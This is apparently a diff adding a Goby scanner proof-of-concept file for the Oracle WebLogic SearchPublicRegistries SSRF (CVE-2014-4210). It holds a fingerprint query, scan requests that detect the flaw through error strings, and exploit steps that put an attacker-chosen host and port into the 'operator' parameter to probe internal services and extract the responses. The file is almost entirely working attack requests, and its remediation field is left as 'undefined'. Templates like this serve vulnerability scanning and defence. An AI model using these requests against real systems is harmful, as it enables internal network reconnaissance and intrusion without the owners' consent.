@@ -1,0 +1,161 @@
+{
+      "Name": "WebLogic SearchPublicRegistries SSRF(CVE-2014-4210)",
+      "Level": "2",
+      "Tags": [],
+      "GobyQuery": "title=\"Search public registries\" || port=\"7001\" || body=\"Search public registries\" || app=\"Oracle-WeblogicPortal\"",
+      "Description": "Weblogic SearchPublicRegistries SSRF(CVE-2014-4210)",
+      "Product": "Oracle WebLogic",
+      "Homepage": "",
+      "Author": "1749115565@qq.com",
+      "Impact": "<p>可探测内网开放的端口和服务</p>",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "https://www.cnblogs.com/bmjoker/p/9759761.html","https://github.com/NHPT/WebLogic-SSRF_CVE-2014-4210"
+      ],
+      "HasExp":true,
+      "ExpParams":[
+          {
+              "name":"payload",
+              "type":"input",
+              "value":"127.0.0.1:65535",
+              "show":""
+          }
+      ],
+      "ScanSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:65535&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "but could not connect over HTTP to server",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:65535&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "returned a 404 error code",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:65535&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "did not have a valid  SOAP content-type",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+        "ExploitSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://{{{payload}}}&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  
+                  "SetVariable": ["output|lastbody|regex|weblogic.uddi.client.structures.exception.XML_SoapException:(.*)"]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://{{{payload}}}&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  
+                  "SetVariable": ["output|lastbody|regex|weblogic.uddi.client.structures.exception.XML_SoapException:(.*)"]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://{{{payload}}}&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  
+                  "SetVariable": ["output|lastbody|regex|weblogic.uddi.client.structures.exception.XML_SoapException:(.*)"]
+            }
+      ],
+      "PostTime": "2020-11-19 16:18:43",
+      "GobyVersion": "1.8.202"
+}
